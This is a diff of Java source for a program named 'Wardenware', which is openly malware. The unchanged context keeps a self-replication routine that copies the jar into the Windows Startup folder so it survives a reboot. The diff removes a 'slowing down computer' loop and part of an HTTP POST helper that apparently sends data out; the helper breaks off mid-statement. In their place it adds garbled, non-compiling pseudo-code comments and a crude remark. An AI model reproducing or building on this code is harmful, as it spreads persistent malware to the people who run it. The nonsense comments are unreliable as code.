@@ -59,31 +59,9 @@ public class Wardenware {
         // Self-replication
         String file = new File(Wardenware.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getPath();
         Runtime.getRuntime().exec("cmd /c copy " + file + " %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
-
-        // Slowing down computer
-        while (true) {
-            try {
-                Thread.sleep(1000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-        }
+//java.exeception.io.channel.(); startup.class(wardenware);
+//if path == file = File(); 
+// path.execute(runtime.exeception);
+////So retarded I removed this bc its an outdated java function, dumb shit
     }
-
-    private static void post(String url, Map<String, String> parameters) throws Exception {
-        URL obj = new URL(url);
-        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-        con.setRequestMethod("POST");
-        con.setRequestProperty("User-Agent", USER_AGENT);
-        con.setDoOutput(true);
-        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
-        wr.writeBytes(getParamsString(parameters));
-        wr.flush();
-        wr.close();
-        int responseCode = con.getResponseCode();
-        System.out.println("\nSending 'POST' request to URL : " + url);
-        System.out.println("Post parameters : " + parameters);
-        System.out.println("Response Code : " + responseCode);
-        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
-        String inputLine;
-        StringBuffer response
+}
